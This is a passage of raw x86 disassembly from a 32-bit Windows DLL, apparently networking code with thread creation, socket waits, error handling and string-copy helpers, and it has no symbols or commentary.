10002aba:	8b d8                	mov    %eax,%ebx
10002abc:	8b c6                	mov    %esi,%eax
10002abe:	e8 0d fa ff ff       	call   0x100024d0
10002ac3:	8d 44 24 3c          	lea    0x3c(%esp),%eax
10002ac7:	50                   	push   %eax
10002ac8:	33 c0                	xor    %eax,%eax
10002aca:	50                   	push   %eax
10002acb:	57                   	push   %edi
10002acc:	68 27 2d 00 10       	push   $0x10002d27
10002ad1:	50                   	push   %eax
10002ad2:	50                   	push   %eax
10002ad3:	ff 15 54 e1 00 10    	call   *0x1000e154
10002ad9:	50                   	push   %eax
10002ada:	ff 15 50 e1 00 10    	call   *0x1000e150
10002ae0:	eb 55                	jmp    0x10002b37
10002ae2:	8b c6                	mov    %esi,%eax
10002ae4:	e8 72 f2 ff ff       	call   0x10001d5b
10002ae9:	8d 44 24 0c          	lea    0xc(%esp),%eax
10002aed:	e8 9e fb ff ff       	call   0x10002690
10002af2:	52                   	push   %edx
10002af3:	50                   	push   %eax
10002af4:	e8 9a f1 ff ff       	call   0x10001c93
10002af9:	85 c0                	test   %eax,%eax
10002afb:	74 33                	je     0x10002b30
10002afd:	6a ff                	push   $0xffffffff
10002aff:	6a ff                	push   $0xffffffff
10002b01:	8d 44 24 14          	lea    0x14(%esp),%eax
10002b05:	e8 80 fb ff ff       	call   0x1000268a
10002b0a:	8b d8                	mov    %eax,%ebx
10002b0c:	8d 44 24 14          	lea    0x14(%esp),%eax
10002b10:	e8 6f fb ff ff       	call   0x10002684
10002b15:	50                   	push   %eax
10002b16:	8d 44 24 18          	lea    0x18(%esp),%eax
10002b1a:	e8 71 fb ff ff       	call   0x10002690
10002b1f:	52                   	push   %edx
10002b20:	50                   	push   %eax
10002b21:	8b ce                	mov    %esi,%ecx
10002b23:	e8 2e f1 ff ff       	call   0x10001c56
10002b28:	83 c0 0c             	add    $0xc,%eax
10002b2b:	e8 a0 f9 ff ff       	call   0x100024d0
10002b30:	8b c6                	mov    %esi,%eax
10002b32:	e8 32 f2 ff ff       	call   0x10001d69
10002b37:	8d 44 24 0c          	lea    0xc(%esp),%eax
10002b3b:	e8 37 fb ff ff       	call   0x10002677
10002b40:	50                   	push   %eax
10002b41:	8d 7c 24 44          	lea    0x44(%esp),%edi
10002b45:	e8 ed f3 ff ff       	call   0x10001f37
10002b4a:	8b cf                	mov    %edi,%ecx
10002b4c:	e8 72 f3 ff ff       	call   0x10001ec3
10002b51:	3b 44 24 38          	cmp    0x38(%esp),%eax
10002b55:	0f 83 6d fe ff ff    	jae    0x100029c8
10002b5b:	eb 17                	jmp    0x10002b74
10002b5d:	56                   	push   %esi
10002b5e:	8d 84 24 8c 00 00 00 	lea    0x8c(%esp),%eax
10002b65:	68 08 e4 00 10       	push   $0x1000e408
10002b6a:	50                   	push   %eax
10002b6b:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10002b71:	83 c4 0c             	add    $0xc,%esp
10002b74:	8d 44 24 0c          	lea    0xc(%esp),%eax
10002b78:	e8 fc 2f 00 00       	call   0x10005b79
10002b7d:	8b 7d 08             	mov    0x8(%ebp),%edi
10002b80:	8b 5c 24 34          	mov    0x34(%esp),%ebx
10002b84:	f6 44 24 5c 20       	testb  $0x20,0x5c(%esp)
10002b89:	0f 84 47 fc ff ff    	je     0x100027d6
10002b8f:	e9 be 00 00 00       	jmp    0x10002c52
10002b94:	83 f8 01             	cmp    $0x1,%eax
10002b97:	0f 84 b5 00 00 00    	je     0x10002c52
10002b9d:	83 f8 02             	cmp    $0x2,%eax
10002ba0:	0f 85 30 fc ff ff    	jne    0x100027d6
10002ba6:	39 74 24 18          	cmp    %esi,0x18(%esp)
10002baa:	74 12                	je     0x10002bbe
10002bac:	8b 44 24 10          	mov    0x10(%esp),%eax
10002bb0:	ff 70 1c             	pushl  0x1c(%eax)
10002bb3:	ff 15 74 e1 00 10    	call   *0x1000e174
10002bb9:	e9 18 fc ff ff       	jmp    0x100027d6
10002bbe:	8b 74 24 10          	mov    0x10(%esp),%esi
10002bc2:	e8 f8 f9 ff ff       	call   0x100025bf
10002bc7:	85 c0                	test   %eax,%eax
10002bc9:	0f 84 07 fc ff ff    	je     0x100027d6
10002bcf:	8d 43 0c             	lea    0xc(%ebx),%eax
10002bd2:	50                   	push   %eax
10002bd3:	8d 43 08             	lea    0x8(%ebx),%eax
10002bd6:	e8 5a f9 ff ff       	call   0x10002535
10002bdb:	8b 43 08             	mov    0x8(%ebx),%eax
10002bde:	33 f6                	xor    %esi,%esi
10002be0:	56                   	push   %esi
10002be1:	56                   	push   %esi
10002be2:	83 c0 0c             	add    $0xc,%eax
10002be5:	56                   	push   %esi
10002be6:	89 44 24 34          	mov    %eax,0x34(%esp)
10002bea:	8d 44 24 2c          	lea    0x2c(%esp),%eax
10002bee:	50                   	push   %eax
10002bef:	6a 01                	push   $0x1
10002bf1:	8d 44 24 3c          	lea    0x3c(%esp),%eax
10002bf5:	50                   	push   %eax
10002bf6:	ff 37                	pushl  (%edi)
10002bf8:	89 5c 24 48          	mov    %ebx,0x48(%esp)
10002bfc:	89 74 24 3c          	mov    %esi,0x3c(%esp)
10002c00:	ff 15 60 e2 00 10    	call   *0x1000e260
10002c06:	83 f8 ff             	cmp    $0xffffffff,%eax
10002c09:	74 27                	je     0x10002c32
10002c0b:	8b 4c 24 20          	mov    0x20(%esp),%ecx
10002c0f:	3b 4c 24 28          	cmp    0x28(%esp),%ecx
10002c13:	72 1d                	jb     0x10002c32
10002c15:	3b c6                	cmp    %esi,%eax
10002c17:	0f 85 b9 fb ff ff    	jne    0x100027d6
10002c1d:	21 74 24 18          	and    %esi,0x18(%esp)
10002c21:	ff 15 40 e1 00 10    	call   *0x1000e140
10002c27:	8b 8f f0 00 00 00    	mov    0xf0(%edi),%ecx
10002c2d:	89 41 34             	mov    %eax,0x34(%ecx)
10002c30:	eb 8c                	jmp    0x10002bbe
10002c32:	ff 15 64 e2 00 10    	call   *0x1000e264
10002c38:	3d 33 27 00 00       	cmp    $0x2733,%eax
10002c3d:	75 13                	jne    0x10002c52
10002c3f:	c7 44 24 18 01 00 00 	movl   $0x1,0x18(%esp)
10002c46:	00 
10002c47:	e9 8a fb ff ff       	jmp    0x100027d6
10002c4c:	ff 15 64 e2 00 10    	call   *0x1000e264
10002c52:	8b 5c 24 24          	mov    0x24(%esp),%ebx
10002c56:	8b c3                	mov    %ebx,%eax
10002c58:	e8 fe f0 ff ff       	call   0x10001d5b
10002c5d:	85 c0                	test   %eax,%eax
10002c5f:	74 3b                	je     0x10002c9c
10002c61:	8b c3                	mov    %ebx,%eax
10002c63:	33 f6                	xor    %esi,%esi
10002c65:	e8 34 77 00 00       	call   0x1000a39e
10002c6a:	85 c0                	test   %eax,%eax
10002c6c:	74 1d                	je     0x10002c8b
10002c6e:	56                   	push   %esi
10002c6f:	8b cb                	mov    %ebx,%ecx
10002c71:	e8 70 f0 ff ff       	call   0x10001ce6
10002c76:	ff 70 30             	pushl  0x30(%eax)
10002c79:	ff 15 3c e1 00 10    	call   *0x1000e13c
10002c7f:	8b c3                	mov    %ebx,%eax
10002c81:	46                   	inc    %esi
10002c82:	e8 17 77 00 00       	call   0x1000a39e
10002c87:	3b f0                	cmp    %eax,%esi
10002c89:	72 e3                	jb     0x10002c6e
10002c8b:	8b c3                	mov    %ebx,%eax
10002c8d:	e8 d7 f0 ff ff       	call   0x10001d69
10002c92:	eb 08                	jmp    0x10002c9c
10002c94:	6a 10                	push   $0x10
10002c96:	ff 15 44 e1 00 10    	call   *0x1000e144
10002c9c:	8b c3                	mov    %ebx,%eax
10002c9e:	e8 fb 76 00 00       	call   0x1000a39e
10002ca3:	85 c0                	test   %eax,%eax
10002ca5:	75 ed                	jne    0x10002c94
10002ca7:	8b 47 08             	mov    0x8(%edi),%eax
10002caa:	85 c0                	test   %eax,%eax
10002cac:	74 07                	je     0x10002cb5
10002cae:	50                   	push   %eax
10002caf:	e8 5f 3d 00 00       	call   0x10006a13
10002cb4:	59                   	pop    %ecx
10002cb5:	ff 77 0c             	pushl  0xc(%edi)
10002cb8:	ff 15 4c e2 00 10    	call   *0x1000e24c
10002cbe:	8b 35 78 e2 00 10    	mov    0x1000e278,%esi
10002cc4:	6a 02                	push   $0x2
10002cc6:	ff 37                	pushl  (%edi)
10002cc8:	ff d6                	call   *%esi
10002cca:	ff 37                	pushl  (%edi)
10002ccc:	8b 1d 84 e2 00 10    	mov    0x1000e284,%ebx
10002cd2:	ff d3                	call   *%ebx
10002cd4:	6a 02                	push   $0x2
10002cd6:	ff 77 2c             	pushl  0x2c(%edi)
10002cd9:	ff d6                	call   *%esi
10002cdb:	ff 77 2c             	pushl  0x2c(%edi)
10002cde:	ff d3                	call   *%ebx
10002ce0:	57                   	push   %edi
10002ce1:	e8 2d 3d 00 00       	call   0x10006a13
10002ce6:	59                   	pop    %ecx
10002ce7:	ff 74 24 30          	pushl  0x30(%esp)
10002ceb:	e8 23 3d 00 00       	call   0x10006a13
10002cf0:	8b 44 24 14          	mov    0x14(%esp),%eax
10002cf4:	59                   	pop    %ecx
10002cf5:	e8 49 f7 ff ff       	call   0x10002443
10002cfa:	ff 74 24 10          	pushl  0x10(%esp)
10002cfe:	e8 10 3d 00 00       	call   0x10006a13
10002d03:	59                   	pop    %ecx
10002d04:	8b 4c 24 24          	mov    0x24(%esp),%ecx
10002d08:	85 c9                	test   %ecx,%ecx
10002d0a:	74 07                	je     0x10002d13
10002d0c:	8b 01                	mov    (%ecx),%eax
10002d0e:	6a 01                	push   $0x1
10002d10:	ff 50 04             	call   *0x4(%eax)
10002d13:	8d 44 24 40          	lea    0x40(%esp),%eax
10002d17:	e8 89 f1 ff ff       	call   0x10001ea5
10002d1c:	5f                   	pop    %edi
10002d1d:	5e                   	pop    %esi
10002d1e:	33 c0                	xor    %eax,%eax
10002d20:	5b                   	pop    %ebx
10002d21:	8b e5                	mov    %ebp,%esp
10002d23:	5d                   	pop    %ebp
10002d24:	c2 04 00             	ret    $0x4
10002d27:	55                   	push   %ebp
10002d28:	8b ec                	mov    %esp,%ebp
10002d2a:	83 e4 f8             	and    $0xfffffff8,%esp
10002d2d:	81 ec 2c 02 00 00    	sub    $0x22c,%esp
10002d33:	83 64 24 04 00       	andl   $0x0,0x4(%esp)
10002d38:	53                   	push   %ebx
10002d39:	56                   	push   %esi
10002d3a:	57                   	push   %edi
10002d3b:	8b 7d 08             	mov    0x8(%ebp),%edi
10002d3e:	8b 47 08             	mov    0x8(%edi),%eax
10002d41:	89 44 24 14          	mov    %eax,0x14(%esp)
10002d45:	8d 44 24 18          	lea    0x18(%esp),%eax
10002d49:	50                   	push   %eax
10002d4a:	8d 77 0c             	lea    0xc(%edi),%esi
10002d4d:	33 db                	xor    %ebx,%ebx
10002d4f:	8d 44 24 14          	lea    0x14(%esp),%eax
10002d53:	e8 dd f7 ff ff       	call   0x10002535
10002d58:	8b 74 24 14          	mov    0x14(%esp),%esi
10002d5c:	8d 44 24 10          	lea    0x10(%esp),%eax
10002d60:	50                   	push   %eax
10002d61:	8d 8c 24 2c 01 00 00 	lea    0x12c(%esp),%ecx
10002d68:	8d 44 24 1c          	lea    0x1c(%esp),%eax
10002d6c:	8b d6                	mov    %esi,%edx
10002d6e:	e8 38 ec ff ff       	call   0x100019ab
10002d73:	59                   	pop    %ecx
10002d74:	85 c0                	test   %eax,%eax
10002d76:	75 3b                	jne    0x10002db3
10002d78:	ff 15 40 e1 00 10    	call   *0x1000e140
10002d7e:	8b 8e f0 00 00 00    	mov    0xf0(%esi),%ecx
10002d84:	8b 5c 24 10          	mov    0x10(%esp),%ebx
10002d88:	89 41 2c             	mov    %eax,0x2c(%ecx)
10002d8b:	ff 77 04             	pushl  0x4(%edi)
10002d8e:	8d 84 24 2c 01 00 00 	lea    0x12c(%esp),%eax
10002d95:	ff 37                	pushl  (%edi)
10002d97:	50                   	push   %eax
10002d98:	8b 47 34             	mov    0x34(%edi),%eax
10002d9b:	e8 30 f7 ff ff       	call   0x100024d0
10002da0:	83 7e 2c ff          	cmpl   $0xffffffff,0x2c(%esi)
10002da4:	74 0d                	je     0x10002db3
10002da6:	8b 76 54             	mov    0x54(%esi),%esi
10002da9:	4e                   	dec    %esi
10002daa:	75 07                	jne    0x10002db3
10002dac:	57                   	push   %edi
10002dad:	e8 62 f2 ff ff       	call   0x10002014
10002db2:	59                   	pop    %ecx
10002db3:	ff 77 30             	pushl  0x30(%edi)
10002db6:	ff 15 50 e1 00 10    	call   *0x1000e150
10002dbc:	ff 77 04             	pushl  0x4(%edi)
10002dbf:	8b 77 2c             	mov    0x2c(%edi),%esi
10002dc2:	ff 37                	pushl  (%edi)
10002dc4:	e8 41 ef ff ff       	call   0x10001d0a
10002dc9:	8d 47 0c             	lea    0xc(%edi),%eax
10002dcc:	e8 72 f6 ff ff       	call   0x10002443
10002dd1:	ff 77 08             	pushl  0x8(%edi)
10002dd4:	e8 3a 3c 00 00       	call   0x10006a13
10002dd9:	59                   	pop    %ecx
10002dda:	57                   	push   %edi
10002ddb:	e8 33 3c 00 00       	call   0x10006a13
10002de0:	59                   	pop    %ecx
10002de1:	5f                   	pop    %edi
10002de2:	5e                   	pop    %esi
10002de3:	33 c0                	xor    %eax,%eax
10002de5:	5b                   	pop    %ebx
10002de6:	8b e5                	mov    %ebp,%esp
10002de8:	5d                   	pop    %ebp
10002de9:	c2 04 00             	ret    $0x4
10002dec:	55                   	push   %ebp
10002ded:	8b ec                	mov    %esp,%ebp
10002def:	33 c0                	xor    %eax,%eax
10002df1:	39 45 08             	cmp    %eax,0x8(%ebp)
10002df4:	74 09                	je     0x10002dff
10002df6:	81 7d 08 ff ff ff 7f 	cmpl   $0x7fffffff,0x8(%ebp)
10002dfd:	76 05                	jbe    0x10002e04
10002dff:	b8 57 00 07 80       	mov    $0x80070057,%eax
10002e04:	85 c0                	test   %eax,%eax
10002e06:	78 10                	js     0x10002e18
10002e08:	ff 75 0c             	pushl  0xc(%ebp)
10002e0b:	8b 45 08             	mov    0x8(%ebp),%eax
10002e0e:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
10002e13:	e8 8a 00 00 00       	call   0x10002ea2
10002e18:	5d                   	pop    %ebp
10002e19:	c2 08 00             	ret    $0x8
10002e1c:	55                   	push   %ebp
10002e1d:	8b ec                	mov    %esp,%ebp
10002e1f:	51                   	push   %ecx
10002e20:	8b 4d 08             	mov    0x8(%ebp),%ecx
10002e23:	56                   	push   %esi
10002e24:	57                   	push   %edi
10002e25:	8d 75 fc             	lea    -0x4(%ebp),%esi
10002e28:	e8 20 00 00 00       	call   0x10002e4d
10002e2d:	5e                   	pop    %esi
10002e2e:	85 c0                	test   %eax,%eax
10002e30:	78 17                	js     0x10002e49
10002e32:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10002e35:	8b 45 08             	mov    0x8(%ebp),%eax
10002e38:	ff 75 0c             	pushl  0xc(%ebp)
10002e3b:	2b c1                	sub    %ecx,%eax
10002e3d:	03 cf                	add    %edi,%ecx
10002e3f:	ba ff ff ff 7f       	mov    $0x7fffffff,%edx
10002e44:	e8 59 00 00 00       	call   0x10002ea2
10002e49:	c9                   	leave  
10002e4a:	c2 08 00             	ret    $0x8
10002e4d:	55                   	push   %ebp
10002e4e:	8b ec                	mov    %esp,%ebp
10002e50:	33 c0                	xor    %eax,%eax
10002e52:	85 c9                	test   %ecx,%ecx
10002e54:	74 08                	je     0x10002e5e
10002e56:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
10002e5c:	76 05                	jbe    0x10002e63
10002e5e:	b8 57 00 07 80       	mov    $0x80070057,%eax
10002e63:	85 c0                	test   %eax,%eax
10002e65:	78 34                	js     0x10002e9b
10002e67:	8b 45 08             	mov    0x8(%ebp),%eax
10002e6a:	57                   	push   %edi
10002e6b:	33 ff                	xor    %edi,%edi
10002e6d:	8b d1                	mov    %ecx,%edx
10002e6f:	85 c9                	test   %ecx,%ecx
10002e71:	74 0d                	je     0x10002e80
10002e73:	80 38 00             	cmpb   $0x0,(%eax)
10002e76:	74 04                	je     0x10002e7c
10002e78:	40                   	inc    %eax
10002e79:	4a                   	dec    %edx
10002e7a:	75 f7                	jne    0x10002e73
10002e7c:	85 d2                	test   %edx,%edx
10002e7e:	75 05                	jne    0x10002e85
10002e80:	bf 57 00 07 80       	mov    $0x80070057,%edi
10002e85:	85 f6                	test   %esi,%esi
10002e87:	74 0d                	je     0x10002e96
10002e89:	85 ff                	test   %edi,%edi
10002e8b:	78 06                	js     0x10002e93
10002e8d:	2b ca                	sub    %edx,%ecx
10002e8f:	89 0e                	mov    %ecx,(%esi)
10002e91:	eb 03                	jmp    0x10002e96
10002e93:	83 26 00             	andl   $0x0,(%esi)
10002e96:	8b c7                	mov    %edi,%eax
10002e98:	5f                   	pop    %edi
10002e99:	eb 03                	jmp    0x10002e9e
10002e9b:	83 26 00             	andl   $0x0,(%esi)
10002e9e:	5d                   	pop    %ebp
10002e9f:	c2 04 00             	ret    $0x4
10002ea2:	55                   	push   %ebp
10002ea3:	8b ec                	mov    %esp,%ebp
10002ea5:	53                   	push   %ebx
10002ea6:	8b d8                	mov    %eax,%ebx
10002ea8:	33 c0                	xor    %eax,%eax
10002eaa:	85 db                	test   %ebx,%ebx
10002eac:	74 21                	je     0x10002ecf
10002eae:	56                   	push   %esi
10002eaf:	8b 75 08             	mov    0x8(%ebp),%esi
10002eb2:	57                   	push   %edi
10002eb3:	8b fa                	mov    %edx,%edi
10002eb5:	2b f1                	sub    %ecx,%esi
10002eb7:	85 ff                	test   %edi,%edi
10002eb9:	74 0e                	je     0x10002ec9
10002ebb:	8a 14 0e             	mov    (%esi,%ecx,1),%dl
10002ebe:	84 d2                	test   %dl,%dl
10002ec0:	74 07                	je     0x10002ec9
10002ec2:	88 11                	mov    %dl,(%ecx)
10002ec4:	41                   	inc    %ecx
10002ec5:	4f                   	dec    %edi
10002ec6:	4b                   	dec    %ebx
10002ec7:	75 ee                	jne    0x10002eb7
10002ec9:	5f                   	pop    %edi
10002eca:	5e                   	pop    %esi
10002ecb:	85 db                	test   %ebx,%ebx
10002ecd:	75 06                	jne    0x10002ed5
10002ecf:	49                   	dec    %ecx
10002ed0:	b8 7a 00 07 80       	mov    $0x8007007a,%eax
10002ed5:	c6 01 00             	movb   $0x0,(%ecx)
10002ed8:	5b                   	pop    %ebx
10002ed9:	5d                   	pop    %ebp
10002eda:	c2 04 00             	ret    $0x4
10002edd:	55                   	push   %ebp
10002ede:	8b ec                	mov    %esp,%ebp
10002ee0:	8b 4d 14             	mov    0x14(%ebp),%ecx
10002ee3:	56                   	push   %esi
10002ee4:	ff 75 18             	pushl  0x18(%ebp)
10002ee7:	8b 75 08             	mov    0x8(%ebp),%esi
10002eea:	ff 75 10             	pushl  0x10(%ebp)
10002eed:	ff 75 0c             	pushl  0xc(%ebp)
10002ef0:	e8 c7 02 00 00       	call   0x100031bc
10002ef5:	83 c4 0c             	add    $0xc,%esp
10002ef8:	5e                   	pop    %esi
10002ef9:	5d                   	pop    %ebp
10002efa:	c2 14 00             	ret    $0x14
10002efd:	55                   	push   %ebp
10002efe:	8b ec                	mov    %esp,%ebp
10002f00:	68 10 27 00 00       	push   $0x2710
10002f05:	ff 15 44 e1 00 10    	call   *0x1000e144
10002f0b:	8b 4d 08             	mov    0x8(%ebp),%ecx
10002f0e:	e8 15 08 00 00       	call   0x10003728
10002f13:	33 c0                	xor    %eax,%eax
10002f15:	5d                   	pop    %ebp
10002f16:	c2 04 00             	ret    $0x4
10002f19:	55                   	push   %ebp
10002f1a:	8b ec                	mov    %esp,%ebp
10002f1c:	8b 45 0c             	mov    0xc(%ebp),%eax
10002f1f:	8b 88 b0 02 00 00    	mov    0x2b0(%eax),%ecx
10002f25:	85 c9                	test   %ecx,%ecx
10002f27:	74 0f                	je     0x10002f38
10002f29:	ff 75 10             	pushl  0x10(%ebp)
10002f2c:	ff 75 08             	pushl  0x8(%ebp)
10002f2f:	ff b0 b4 02 00 00    	pushl  0x2b4(%eax)
10002f35:	50                   	push   %eax
10002f36:	ff d1                	call   *%ecx
10002f38:	5d                   	pop    %ebp
10002f39:	c2 0c 00             	ret    $0xc
10002f3c:	55                   	push   %ebp
10002f3d:	8b ec                	mov    %esp,%ebp
10002f3f:	51                   	push   %ecx
10002f40:	33 c0                	xor    %eax,%eax
10002f42:	8d 4d fc             	lea    -0x4(%ebp),%ecx
10002f45:	51                   	push   %ecx
10002f46:	50                   	push   %eax
10002f47:	ff 75 10             	pushl  0x10(%ebp)
10002f4a:	89 45 fc             	mov    %eax,-0x4(%ebp)
10002f4d:	68 fd 2e 00 10       	push   $0x10002efd
10002f52:	50                   	push   %eax
10002f53:	50                   	push   %eax
10002f54:	ff 15 54 e1 00 10    	call   *0x1000e154
10002f5a:	50                   	push   %eax
10002f5b:	ff 15 50 e1 00 10    	call   *0x1000e150
10002f61:	c9                   	leave  
10002f62:	c3                   	ret    
10002f63:	55                   	push   %ebp
10002f64:	8b ec                	mov    %esp,%ebp
10002f66:	57                   	push   %edi
10002f67:	8b 7d 08             	mov    0x8(%ebp),%edi
10002f6a:	85 ff                	test   %edi,%edi
10002f6c:	74 32                	je     0x10002fa0
10002f6e:	83 bf a8 02 00 00 00 	cmpl   $0x0,0x2a8(%edi)
10002f75:	74 23                	je     0x10002f9a
10002f77:	56                   	push   %esi
10002f78:	6a 00                	push   $0x0
10002f7a:	e8 4b 0a 00 00       	call   0x100039ca
10002f7f:	8b f0                	mov    %eax,%esi
10002f81:	85 f6                	test   %esi,%esi
10002f83:	74 14                	je     0x10002f99
10002f85:	56                   	push   %esi
10002f86:	ff b7 ac 02 00 00    	pushl  0x2ac(%edi)
10002f8c:	57                   	push   %edi
10002f8d:	ff 97 a8 02 00 00    	call   *0x2a8(%edi)
10002f93:	56                   	push   %esi
10002f94:	e8 36 11 00 00       	call   0x100040cf
10002f99:	5e                   	pop    %esi
10002f9a:	57                   	push   %edi
10002f9b:	e8 f3 01 00 00       	call   0x10003193
10002fa0:	33 c0                	xor    %eax,%eax
10002fa2:	5f                   	pop    %edi
10002fa3:	5d                   	pop    %ebp
10002fa4:	c2 04 00             	ret    $0x4
10002fa7:	55                   	push   %ebp
10002fa8:	8b ec                	mov    %esp,%ebp
10002faa:	81 ec 00 01 00 00    	sub    $0x100,%esp
10002fb0:	53                   	push   %ebx
10002fb1:	56                   	push   %esi
10002fb2:	57                   	push   %edi
10002fb3:	8b f8                	mov    %eax,%edi
10002fb5:	ff 77 20             	pushl  0x20(%edi)
10002fb8:	8d 4f 08             	lea    0x8(%edi),%ecx
10002fbb:	33 db                	xor    %ebx,%ebx
10002fbd:	e8 a9 73 00 00       	call   0x1000a36b
10002fc2:	ff 30                	pushl  (%eax)
10002fc4:	ff b7 bc 02 00 00    	pushl  0x2bc(%edi)
10002fca:	e8 73 51 00 00       	call   0x10008142
10002fcf:	53                   	push   %ebx
10002fd0:	e8 f5 09 00 00       	call   0x100039ca
10002fd5:	8b f0                	mov    %eax,%esi
10002fd7:	3b f3                	cmp    %ebx,%esi
10002fd9:	74 2b                	je     0x10003006
10002fdb:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
10002fe1:	50                   	push   %eax
10002fe2:	8b c6                	mov    %esi,%eax
10002fe4:	e8 d3 1d 00 00       	call   0x10004dbc
10002fe9:	85 c0                	test   %eax,%eax
10002feb:	74 13                	je     0x10003000
10002fed:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
10002ff3:	50                   	push   %eax
10002ff4:	ff b7 bc 02 00 00    	pushl  0x2bc(%edi)
10002ffa:	e8 6e 51 00 00       	call   0x1000816d
10002fff:	43                   	inc    %ebx
10003000:	56                   	push   %esi
10003001:	e8 c9 10 00 00       	call   0x100040cf
10003006:	5f                   	pop    %edi
10003007:	5e                   	pop    %esi
10003008:	8b c3                	mov    %ebx,%eax
1000300a:	5b                   	pop    %ebx
1000300b:	c9                   	leave  
1000300c:	c3                   	ret    
1000300d:	55                   	push   %ebp
1000300e:	8b ec                	mov    %esp,%ebp
10003010:	56                   	push   %esi
10003011:	8b 75 0c             	mov    0xc(%ebp),%esi
10003014:	8b c6                	mov    %esi,%eax
10003016:	e8 8c ff ff ff       	call   0x10002fa7
1000301b:	85 c0                	test   %eax,%eax
1000301d:	74 0f                	je     0x1000302e
1000301f:	33 c0                	xor    %eax,%eax
10003021:	50                   	push   %eax
10003022:	50                   	push   %eax
10003023:	56                   	push   %esi
10003024:	89 46 24             	mov    %eax,0x24(%esi)
10003027:	68 63 2f 00 10       	push   $0x10002f63
1000302c:	eb 0a                	jmp    0x10003038
1000302e:	33 c0                	xor    %eax,%eax
10003030:	50                   	push   %eax
10003031:	50                   	push   %eax
10003032:	56                   	push   %esi
10003033:	68 fd 2e 00 10       	push   $0x10002efd
10003038:	50                   	push   %eax
10003039:	50                   	push   %eax
1000303a:	ff 15 54 e1 00 10    	call   *0x1000e154
10003040:	50                   	push   %eax
10003041:	ff 15 50 e1 00 10    	call   *0x1000e150
10003047:	5e                   	pop    %esi
10003048:	5d                   	pop    %ebp
10003049:	c2 08 00             	ret    $0x8
1000304c:	83 7e 28 00          	cmpl   $0x0,0x28(%esi)
10003050:	74 09                	je     0x1000305b
10003052:	ff 76 14             	pushl  0x14(%esi)
10003055:	e8 b9 39 00 00       	call   0x10006a13
1000305a:	59                   	pop    %ecx
1000305b:	83 7e 24 00          	cmpl   $0x0,0x24(%esi)
1000305f:	74 09                	je     0x1000306a
10003061:	ff 76 10             	pushl  0x10(%esi)
10003064:	e8 aa 39 00 00       	call   0x10006a13
10003069:	59                   	pop    %ecx
1000306a:	83 7e 20 00          	cmpl   $0x0,0x20(%esi)
1000306e:	74 07                	je     0x10003077
10003070:	56                   	push   %esi
10003071:	e8 9d 39 00 00       	call   0x10006a13
10003076:	59                   	pop    %ecx
10003077:	c3                   	ret    
10003078:	55                   	push   %ebp
10003079:	8b ec                	mov    %esp,%ebp
1000307b:	51                   	push   %ecx
1000307c:	51                   	push   %ecx
1000307d:	53                   	push   %ebx
1000307e:	56                   	push   %esi
1000307f:	8b 75 08             	mov    0x8(%ebp),%esi
10003082:	57                   	push   %edi
10003083:	6a 00                	push   $0x0
10003085:	8b fe                	mov    %esi,%edi
10003087:	e8 3e 09 00 00       	call   0x100039ca
1000308c:	8b f8                	mov    %eax,%edi
1000308e:	c7 45 fc 0d 00 00 00 	movl   $0xd,-0x4(%ebp)
10003095:	85 ff                	test   %edi,%edi
10003097:	74 7f                	je     0x10003118
10003099:	8b c6                	mov    %esi,%eax
1000309b:	e8 0d 09 00 00       	call   0x100039ad
100030a0:	85 c0                	test   %eax,%eax
100030a2:	74 6e                	je     0x10003112
100030a4:	8d 86 80 03 00 00    	lea    0x380(%esi),%eax
100030aa:	89 45 f8             	mov    %eax,-0x8(%ebp)
100030ad:	e8 40 70 00 00       	call   0x1000a0f2
100030b2:	85 c0                	test   %eax,%eax
100030b4:	74 55                	je     0x1000310b
100030b6:	8b b6 84 03 00 00    	mov    0x384(%esi),%esi
100030bc:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
100030c0:	75 13                	jne    0x100030d5
100030c2:	ff 76 10             	pushl  0x10(%esi)
100030c5:	ff 76 0c             	pushl  0xc(%esi)
100030c8:	e8 5a 1e 00 00       	call   0x10004f27
100030cd:	85 c0                	test   %eax,%eax
100030cf:	74 04                	je     0x100030d5
100030d1:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100030d5:	83 7e 08 02          	cmpl   $0x2,0x8(%esi)
100030d9:	75 1e                	jne    0x100030f9
100030db:	ff 76 10             	pushl  0x10(%esi)
100030de:	8b df                	mov    %edi,%ebx
100030e0:	ff 76 1c             	pushl  0x1c(%esi)
100030e3:	ff 76 18             	pushl  0x18(%esi)
100030e6:	ff 76 14             	pushl  0x14(%esi)
100030e9:	ff 76 0c             	pushl  0xc(%esi)
100030ec:	e8 93 1f 00 00       	call   0x10005084
100030f1:	85 c0                	test   %eax,%eax
100030f3:	74 04                	je     0x100030f9
100030f5:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100030f9:	e8 4e ff ff ff       	call   0x1000304c
100030fe:	8b 75 f8             	mov    -0x8(%ebp),%esi
10003101:	33 d2                	xor    %edx,%edx
10003103:	e8 82 70 00 00       	call   0x1000a18a
10003108:	8b 75 08             	mov    0x8(%ebp),%esi
1000310b:	8b c6                	mov    %esi,%eax
1000310d:	e8 ab 08 00 00       	call   0x100039bd
10003112:	57                   	push   %edi
10003113:	e8 b7 0f 00 00       	call   0x100040cf
10003118:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000311b:	5f                   	pop    %edi
1000311c:	5e                   	pop    %esi
1000311d:	5b                   	pop    %ebx
1000311e:	c9                   	leave  
1000311f:	c2 04 00             	ret    $0x4
10003122:	c7 80 a8 02 00 00 7a 	movl   $0x1000cd7a,0x2a8(%eax)
10003129:	cd 00 10 
1000312c:	89 88 ac 02 00 00    	mov    %ecx,0x2ac(%eax)
10003132:	33 c0                	xor    %eax,%eax
10003134:	40                   	inc    %eax
10003135:	c3                   	ret    
10003136:	c7 80 b0 02 00 00 67 	movl   $0x1000cd67,0x2b0(%eax)
1000313d:	cd 00 10 
10003140:	89 88 b4 02 00 00    	mov    %ecx,0x2b4(%eax)
10003146:	33 c0                	xor    %eax,%eax
10003148:	40                   	inc    %eax
10003149:	c3                   	ret    
1000314a:	55                   	push   %ebp
1000314b:	8b ec                	mov    %esp,%ebp
1000314d:	53                   	push   %ebx
1000314e:	56                   	push   %esi
1000314f:	6a 01                	push   $0x1
10003151:	33 db                	xor    %ebx,%ebx
10003153:	e8 72 08 00 00       	call   0x100039ca
